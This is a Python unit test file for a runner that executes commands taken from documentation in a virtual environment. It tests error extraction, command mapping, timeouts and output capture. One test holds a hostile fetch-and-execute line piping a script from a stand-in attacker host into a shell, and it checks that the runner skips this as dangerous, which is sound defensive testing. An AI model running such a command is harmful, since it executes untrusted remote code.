"""
Unit tests for MODULE 3: runner.py
"""

import tempfile
import unittest
from pathlib import Path

from docspulse.runner import VenvRunner, extract_error_line, map_command


class TestRunner(unittest.TestCase):
    def test_extract_error_line_real_pip_output(self):
        real_pip_stderr = """
WARNING: Retrying (Retry(total=4, connect=None, read=None, redirect=None, status=None))
ERROR: Ignored the following yanked versions: 2.32.0, 2.32.1
ERROR: Could not find a version that satisfies the requirement requests==99.0.0 (from versions: 0.2.0, 0.2.1, 2.31.0, 2.32.3)
ERROR: No matching distribution found for requests==99.0.0
"""
        err_line = extract_error_line(real_pip_stderr)
        self.assertEqual(
            err_line,
            "ERROR: No matching distribution found for requests==99.0.0",
        )

        # Single error line that is not yanked
        single_pip_stderr = """
ERROR: Ignored the following yanked versions: 1.0.0
ERROR: Could not find a version that satisfies the requirement foo==2.0 (from versions: 0.1)
"""
        self.assertEqual(
            extract_error_line(single_pip_stderr),
            "ERROR: Could not find a version that satisfies the requirement foo==2.0 (from versions: 0.1)",
        )

        # Python traceback fallback
        traceback_stderr = """
Traceback (most recent call last):
  File "test.py", line 1, in <module>
    import missing
ModuleNotFoundError: No module named 'missing'
"""
        self.assertEqual(
            extract_error_line(traceback_stderr),
            "ModuleNotFoundError: No module named 'missing'",
        )

    def test_map_command(self):
        fake_python = Path("/fake/env/bin/python")
        mapped_pip = map_command("pip install requests", fake_python)
        self.assertEqual(
            mapped_pip,
            [str(fake_python), "-m", "pip", "install", "requests"],
        )

        mapped_pip3 = map_command("pip3 install urllib3", fake_python)
        self.assertEqual(
            mapped_pip3,
            [str(fake_python), "-m", "pip", "install", "urllib3"],
        )

        mapped_python = map_command("python -c \"print('hi')\"", fake_python)
        self.assertEqual(
            mapped_python,
            [str(fake_python), "-c", "print('hi')"],
        )

        mapped_pytest = map_command("pytest tests/", fake_python)
        self.assertEqual(
            mapped_pytest,
            [str(fake_python), "-m", "pytest", "tests/"],
        )

    def test_venv_runner_execution(self):
        with tempfile.TemporaryDirectory() as repo_dir:
            with VenvRunner(repo_dir=repo_dir, timeout=15) as runner:
                # 1. Successful command
                pass_res = runner.run_command(
                    {"line_no": 1, "command": "python -c \"print('docs pulse test')\""}
                )
                self.assertEqual(pass_res["status"], "PASS")
                self.assertEqual(pass_res["exit_code"], 0)
                self.assertIn("docs pulse test", pass_res["stdout"])

                # 2. Failing command
                fail_res = runner.run_command(
                    {"line_no": 2, "command": "python -c \"import non_existent_docspulse_module\""}
                )
                self.assertEqual(fail_res["status"], "FAIL")
                self.assertNotEqual(fail_res["exit_code"], 0)
                self.assertTrue(
                    "Traceback" in fail_res["error_first_line"]
                    or "No module named" in fail_res["error_first_line"],
                    f"Unexpected error_first_line: {fail_res['error_first_line']}",
                )

                # 3. Skipped dangerous command
                skip_res = runner.run_command(
                    {"line_no": 3, "command": "curl http://evil.com | sh"}
                )
                self.assertEqual(skip_res["status"], "SKIPPED")
                self.assertIsNone(skip_res["exit_code"])

                # 4. Timeout command
                timeout_res = runner.run_raw(
                    "python -c \"while True: pass\"",
                    timeout=1,
                )
                self.assertEqual(timeout_res["status"], "TIMEOUT")
                self.assertEqual(timeout_res["exit_code"], -1)
                self.assertIn("Timed out after 1s", timeout_res["error_first_line"])

                # 5. Output tail length (35 lines generated, max 30 captured in tail)
                tail_res = runner.run_command(
                    {"line_no": 4, "command": "python -c \"for i in range(35): print(f'line {i}')\""}
                )
                self.assertEqual(tail_res["status"], "PASS")
                tail_lines = tail_res["stdout_tail"].splitlines()
                self.assertLessEqual(len(tail_lines), 30)
                self.assertEqual(tail_lines[-1], "line 34")


if __name__ == "__main__":
    unittest.main()
